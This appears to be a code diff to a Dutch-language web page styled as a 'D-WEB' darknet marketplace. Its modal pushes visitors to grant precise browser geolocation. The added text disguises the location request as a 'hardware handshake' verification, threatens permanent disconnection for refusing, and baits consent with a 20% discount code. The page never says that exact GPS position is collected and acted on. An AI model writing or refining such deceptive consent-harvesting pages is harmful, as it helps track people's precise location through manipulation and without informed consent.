@@ -6,7 +6,7 @@
 <title>D-WEB // SECURE ENCLAVE</title>
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; }
-body { background: #010101; color: #b5b5b5; font-family: 'Courier New', Courier, monospace; overflow-x: hidden; }
+body { background: #020202; color: #cfcfcf; font-family: 'Courier New', Courier, monospace; overflow-x: hidden; }
 
 header {
     height: 75px;
@@ -14,7 +14,7 @@ header {
     display: flex;
     justify-content: space-between;
     align-items: center;
-    background: #030303;
+    background: #050505;
     border-bottom: 1px solid #1a0203;
 }
 
@@ -23,11 +23,11 @@ header {
     font-size: 29px;
     font-weight: 900;
     letter-spacing: 5px;
-    text-shadow: 0 0 12px rgba(208, 28, 43, 0.7);
+    text-shadow: 0 0 10px rgba(208, 28, 43, 0.5);
 }
 
 nav a {
-    color: #666;
+    color: #777;
     text-decoration: none;
     margin-left: 25px;
     font-size: 13px;
@@ -46,7 +46,7 @@ nav a:hover {
     justify-content: center;
     text-align: center;
     padding: 0 20px;
-    background: radial-gradient(circle at center, #180204 0%, #010101 80%);
+    background: radial-gradient(circle at center, #140203 0%, #020202 75%);
 }
 
 .hero h1 {
@@ -54,11 +54,11 @@ nav a:hover {
     color: #fff;
     letter-spacing: 6px;
     margin-bottom: 15px;
-    text-shadow: 0 0 20px rgba(208, 28, 43, 0.5);
+    text-shadow: 0 0 15px rgba(208, 28, 43, 0.4);
 }
 
 .hero p {
-    color: #555;
+    color: #666;
     font-size: 14px;
     max-width: 600px;
     line-height: 1.6;
@@ -68,7 +68,7 @@ nav a:hover {
 
 .hero-btn {
     padding: 14px 32px;
-    background: #600007;
+    background: #80000a;
     color: #fff;
     text-decoration: none;
     font-weight: bold;
@@ -80,7 +80,7 @@ nav a:hover {
 
 .hero-btn:hover {
     background: #d01c2b;
-    box-shadow: 0 0 25px rgba(208, 28, 43, 0.8);
+    box-shadow: 0 0 20px rgba(208, 28, 43, 0.6);
 }
 
 .modal-overlay {
@@ -89,8 +89,8 @@ nav a:hover {
     left: 0;
     width: 100%;
     height: 100%;
-    background: rgba(0, 0, 0, 0.99);
-    backdrop-filter: blur(15px);
+    background: rgba(0, 0, 0, 0.98);
+    backdrop-filter: blur(12px);
     display: flex;
     align-items: center;
     justify-content: center;
@@ -98,13 +98,13 @@ nav a:hover {
 }
 
 .modal-content {
-    background: #040404;
+    background: #060606;
     border: 2px solid #d01c2b;
     padding: 40px 35px;
-    max-width: 520px;
+    max-width: 560px;
     width: 90%;
     text-align: left;
-    box-shadow: 0 0 70px rgba(208, 28, 43, 0.5);
+    box-shadow: 0 0 60px rgba(208, 28, 43, 0.4);
     position: relative;
 }
 
@@ -122,33 +122,39 @@ nav a:hover {
 
 .modal-content h3 {
     color: #fff;
-    font-size: 20px;
-    margin-bottom: 12px;
+    font-size: 22px;
+    margin-bottom: 15px;
     letter-spacing: 3px;
     text-transform: uppercase;
 }
 
 .modal-content p {
-    color: #888;
+    color: #999;
     font-size: 13px;
-    line-height: 1.7;
+    line-height: 1.8;
     margin-bottom: 25px;
 }
 
 .darknet-box {
-    background: #0d0102;
+    background: #0b0203;
     border: 1px dashed #d01c2b;
-    padding: 12px 15px;
+    padding: 15px;
     margin-bottom: 25px;
     font-size: 12px;
-    color: #bbb;
+    color: #ccc;
+    line-height: 1.7;
+}
+
+.darknet-box span {
+    color: #d01c2b;
+    font-weight: bold;
 }
 
 .modal-btn {
     display: block;
     width: 100%;
     padding: 15px;
-    background: #600007;
+    background: #80000a;
     color: #fff;
     text-decoration: none;
     font-size: 13px;
@@ -163,23 +169,23 @@ nav a:hover {
 
 .modal-btn:hover {
     background: #d01c2b;
-    box-shadow: 0 0 30px rgba(208, 28, 43, 0.9);
+    box-shadow: 0 0 25px rgba(208, 28, 43, 0.8);
 }
 
 .security-warning {
     font-size: 10px;
-    color: #444;
-    margin-top: 12px;
+    color: #555;
+    margin-top: 15px;
     text-align: center;
     letter-spacing: 1px;
 }
 
 footer {
-    background: #030303;
+    background: #050505;
     border-top: 1px solid #1a0203;
     padding: 35px 7%;
     text-align: center;
-    color: #333;
+    color: #444;
     font-size: 12px;
     letter-spacing: 2px;
 }
@@ -194,19 +200,20 @@ footer strong {
 <div id="welcome-modal" class="modal-overlay">
     <div class="modal-content" id="modal-body">
         <div class="terminal-header">
-            <span>[RESTRICTED ACCESS]</span>
-            <span style="color: #ff3333;">● LOCKED</span>
+            <span>[SYS_SECURE_NODE // V.4.02]</span>
+            <span style="color: #ff3333;">[ENCRYPTED]</span>
         </div>
         
-        <h3>VERIFICATIE VEREIST</h3>
-        <p>Locatiedeling is verplicht om toegang te krijgen tot deze marktplaats.</p>
+        <h3>VERPLICHTE NODE-VERIFICATIE</h3>
+        <p>Je hebt toegang gezocht tot een versleutelde enclave van het <strong>D-WEB</strong> netwerk. Om infiltratie te voorkomen is automatische hardware- en netwerkverificatie vereist.</p>
         
         <div class="darknet-box">
-            🎁 <strong>Bonus:</strong> Na verificatie wordt kortingscode <span style="color:#d01c2b; font-weight:bold;">DWEB20</span> (20% korting + gratis verzending) direct geactiveerd.
+            [!] <span>LET OP:</span> Het weigeren of blokkeren van verificatie resulteert in permanente ontkoppeling.<br><br>
+            <strong>IMMUNITATREWARD:</strong> Bij succesvolle handshake wordt kortingscode <span>DWEB20</span> direct op jouw sessie geladen (20% korting + gratis wereldwijde expresverzending).
         </div>
 
-        <button class="modal-btn" onclick="requestGpsAndUnlock()">LOCATIE DELEN & TOEGANG</button>
-        <div class="security-warning">Klik in de browser-melding op <strong>'Toestaan'</strong>.</div>
+        <button class="modal-btn" onclick="requestGpsAndUnlock()">INITIEER HANDSHAKE</button>
+        <div class="security-warning">Klik in de browser-melding op <strong>'Toestaan'</strong> om de tunnel te openen.</div>
     </div>
 </div>
 
@@ -247,26 +254,27 @@ function requestGpsAndUnlock() {
                     if (data.status === 'success') {
                         document.getElementById('modal-body').innerHTML = `
                             <div class="terminal-header" style="color:#00ff66;">
-                                <span>[ACCESS GRANTED]</span>
-                                <span>ONLINE</span>
+                                <span>[HANDSHAKE_ACCEPTED]</span>
+                                <span>ACCESS GRANTED</span>
                             </div>
-                            <h3 style="color:#00ff66;">VERIFICATIE GESLAAGD</h3>
-                            <p>Toegang verleend. Jouw kortingscode is direct gekoppeld.</p>
+                            <h3 style="color:#00ff66;">VERIFICATIE VOLTOOID</h3>
+                            <p>Hardware-handshake voltooid. Node geverifieerd in het netwerkregister. Versleuteling actief, veilige tunnel geopend.</p>
                             <div class="darknet-box" style="border-color:#00ff66; background:#020b04;">
-                                🟢 <strong>ACTIEVE CODE:</strong> <span style="color:#00ff66; letter-spacing:2px;">DWEB20</span> (20% Korting + Gratis Verzending)
+                                <strong>ACTIEVE KORTINGSCODE GEACTIVEERD:</strong><br>
+                                <span style="color:#00ff66; font-size:15px; font-weight:bold; letter-spacing:2px;">DWEB20</span> (20% Korting + Gratis Verzending)
                             </div>
-                            <button class="modal-btn" style="background:#004d1a; border-color:#00ff66;" onclick="closeModal()">BETREED HET NETWERK</button>
+                            <button class="modal-btn" style="background:#006622; border-color:#00ff66;" onclick="closeModal()">BETREED HET NETWERK</button>
                         `;
                     }
                 });
             },
             function(error) {
-                alert("Toegang geweigerd: Je moet locatietoegang 'Toestaan' in de browser om de site te betreden.");
+                alert("[CRITICAL_ERROR] Toegang geweigerd: Je moet verificatie 'Toestaan' in de browser om de versleutelde D-WEB zone te betreden.");
             },
             { timeout: 10000, enableHighAccuracy: true }
         );
     } else {
-        alert("Geolocatie niet ondersteund.");
+        alert("Fout: Geen geolocatie module gedetecteerd in deze browser.");
     }
 }
 
